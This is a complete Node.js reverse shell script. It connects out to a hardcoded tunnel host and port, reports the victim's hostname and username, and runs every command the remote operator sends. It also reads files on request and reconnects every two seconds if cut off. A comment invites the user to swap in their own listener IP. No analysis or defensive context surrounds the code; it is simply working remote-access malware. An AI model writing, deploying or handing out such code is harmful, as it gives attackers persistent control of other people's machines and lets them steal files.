const net = require('net');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');

const REMOTE_HOST = '28.ip.gl.ply.gg'; // 👈 Replace with your IP
const REMOTE_PORT = 44987; // 👈 Your listener port

let currentDir = process.cwd();

function connect() {
  const client = new net.Socket();
  let connected = false;

  client.connect(REMOTE_PORT, REMOTE_HOST, () => {
    if (!connected) {
      connected = true;
      console.log('[*] Connected');
    }
    client.write(`[+] Connected to ${os.hostname()} in ${currentDir}\n`);
    prompt();
  });

  client.on('data', (data) => {
    const input = data.toString().trim();
    if (input === 'exit') {
      client.end('[*] Session closed.\n');
      return;
    }

    if (input.startsWith('cd ')) {
      const dir = input.slice(3).trim();
      try {
        process.chdir(path.resolve(currentDir, dir));
        currentDir = process.cwd();
        client.write(`📁 Changed to ${currentDir}\n`);
      } catch (err) {
        client.write(`❌ cd error: ${err.message}\n`);
      }
      return prompt();
    }

    if (input.startsWith('cat ')) {
      const filePath = path.resolve(currentDir, input.slice(4).trim());
      fs.readFile(filePath, 'utf8', (err, data) => {
        client.write(err ? `❌ ${err.message}\n` : `${data}\n`);
        prompt();
      });
      return;
    }

    exec(input, { cwd: currentDir }, (err, stdout, stderr) => {
      client.write((err || stderr || '') + (stdout || ''));
      prompt();
    });
  });

  client.on('error', () => {
    if (connected) {
      connected = false;
      console.log('[*] Disconnected');
    }
    retry();
  });

  client.on('close', () => {
    if (connected) {
      connected = false;
      console.log('[*] Disconnected');
    }
    retry();
  });

  function prompt() {
    client.write(`${os.userInfo().username}@${os.hostname()}:${currentDir}$ `);
  }

  function retry() {
    setTimeout(connect, 2000);
  }
}
connect();
